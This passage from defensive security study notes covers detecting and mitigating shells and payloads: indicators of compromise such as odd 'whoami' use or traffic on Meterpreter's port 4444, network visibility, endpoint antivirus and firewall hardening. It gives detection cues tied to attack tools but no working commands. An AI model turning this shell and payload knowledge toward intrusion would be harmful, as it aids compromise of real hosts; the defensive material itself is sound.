- `File uploads`: Especially with Web Applications, file uploads are a common method of acquiring a shell on a host besides direct command execution in the browser. Pay attention to application logs to determine if anyone has uploaded anything potentially malicious. The use of firewalls and anti-virus can add more layers to your security posture around the site. Any host exposed to the internet from your network should be sufficiently hardened and monitored.
- `Suspicious non-admin user actions`: Looking for simple things like normal users issuing commands via Bash or cmd can be a significant indicator of compromise. When was the last time an average user, much less an admin, had to issue the command `whoami` on a host? Users connecting to a share on another host in the network over SMB that is not a normal infrastructure share can also be suspicious. This type of interaction usually is end host to infrastructure server, not end host to end host. Enabling security measures such as logging all user interactions, PowerShell logging, and other features that take note when a shell interface is used will provide you with more insight.
- `Anomalous network sessions`: Users tend to have a pattern they follow for network interaction. They visit the same websites, use the same applications, and often perform those actions multiple times a day like clockwork. Logging and parsing NetFlow data can be a great way to spot anomalous network traffic. Looking at things such as top talkers, or unique site visits, watching for a heartbeat on a nonstandard port (like 4444, the default port used by Meterpreter), and monitoring any remote login attempts or bulk GET / POST requests in short amounts of time can all be indicators of compromise or attempted exploitation. Using tools like network monitors, firewall logs, and SIEMS can help bring a bit of order to the chaos that is network traffic.
## Establish Network Visibility

Much like identifying and then using various shells & payloads, `detection` & `prevention` requires a detailed understanding of the systems and overall network environment you are trying to protect. It's always essential to have good documentation practices so individuals responsible for keeping the environment secure can have consistent visibility of the devices, data, and traffic flow in the environments they administer. Developing & maintaining visual network topology diagrams can help visualize network traffic flow. Newer tools like [netbrain](https://www.netbraintech.com) may be good to research as they combine visual diagraming that can be achieved with tools like [Draw.io](https://draw.io), documentation and remote management. Interactive visual network topologies allow you to interact with the routers, network firewalls, IDS/IPS appliances, switches, and hosts (clients). Tools like this are becoming more common to use as it can be challenging to keep the visibility of the network updated, especially in larger environments that are constantly growing.

Some network device vendors like Cisco Meraki, Ubiquiti, Check Point, and Palo Alto Networks are building layer 7 visibility (like layer 7 of the OSI model) into their network devices and moving the management capabilities to cloud-based network controllers. This means admins log in to a web portal to manage all the network devices in the environment. A visual dashboard is often provided with these cloud-based network controllers making it easier to have a `baseline` of the traffic usage, network protocols, applications, and inbound & outbound traffic. Having and understanding the baseline of your network will make any deviation from the norm extremely visible. The faster you can react and triage any potential issue, the less time for possible leaks, destruction of data, or worse.

Keep in mind that if a payload is successfully executed, it will need to communicate over the network, so this is why network visibility is essential within the context of shells & payloads. Having a network security appliance capable of [deep packet inspection](https://en.wikipedia.org/wiki/Deep_packet_inspection) can often act as an anti-virus for the network. Some of the payloads we discussed could get detected & blocked at the network level if successfully executed on the hosts. This is especially easy to detect if traffic is not encrypted. When we used Netcat in the bind & reverse shell sections, the traffic passing between the source and destination (target) was `not encrypted`. Someone could capture that traffic and see every command we sent between our attack box and the target.
## Protecting End Devices

`End devices` are the devices that connect at the "end" of a network. This means they are either the source or destination of data transmission. Some examples of end devices would be:

- Workstations (employees computers)
- Servers (providing various services on the network)
- Printers
- Network Attached Storage (NAS)
- Cameras
- Smart TVs
- Smart Speakers

We should prioritize the protection of these kinds of devices, especially those that run an operating system with a `CLI` that can be remotely accessed. The same interface that makes it easy to administer and automate tasks on a device can make it a good target for attackers. As simple as this seems, having anti-virus installed & enabled is a great start. The most common successful attack vector besides misconfiguration is the human element. All it takes is for a user to click a link or open a file, and they can be compromised. Having monitoring and alerting on your end devices can help detect and potentially prevent issues before they happen.

On `Windows` systems, `Windows Defender` (also known as Windows Security or Microsoft Defender) is present at install and should be left enabled. Also, ensuring the Defender Firewall is left enabled with all profiles (Domain, Private and Public) left on. Only make exceptions for approved applications based on a [change management process](https://www.atlassian.com/itsm/change-management). Establish a [patch management](https://www.rapid7.com/fundamentals/patch-management/) strategy (if not already established) to ensure that all hosts are receiving updates shortly after Microsoft releases them. All of this applies to servers hosting shared resources and websites as well. Though it can slow performance, AV on a server can prevent the execution of a payload and the establishment of a shell session with a malicious attacker's system.
## Potential Mitigations:

Consider the list below when considering what implementations you can put in place to mitigate many of these vectors or exploits.

- `Application Sandboxing`: By sandboxing your applications that are exposed to the world, you can limit the scope of access and damage an attacker can perform if they find a vulnerability or misconfiguration in the application.
- `Least Privilege Permission Policies`: Limiting the permissions users have can go a long way to help stop unauthorized access or compromise. Does an ordinary user need administrative access to perform their daily duties? What about domain admin? Not really, right? Ensuring proper security policies and permissions are in place will often hinder if not outright stop an attack.
- `Host Segmentation & Hardening`: Properly hardening hosts and segregating any hosts that require exposure to the internet can help ensure an attacker cannot easily hop in and move laterally into your network if they gain access to a boundary host. Following STIG hardening guides and placing hosts such as web servers, VPN servers, etc., in a DMZ or 'quarantine' network segment will stop that type of access and lateral movement.
- `Physical and Application Layer Firewalls`: Firewalls can be powerful tools if appropriately implemented. Proper inbound and outbound rules that only allow traffic first established from within your network, on ports approved for your applications, and denying inbound traffic from your network addresses or other prohibited IP space can cripple many bind and reverse shells. It adds a hop in the network chain, and network implementations such as Network Address Translation (NAT) can break the functionality of a [Shell](../../../3%20-%20Tags/Hacking%20Concepts/Shell.md) [Payload](../../../3%20-%20Tags/Hacking%20Concepts/Payload.md) if it is not taken into account.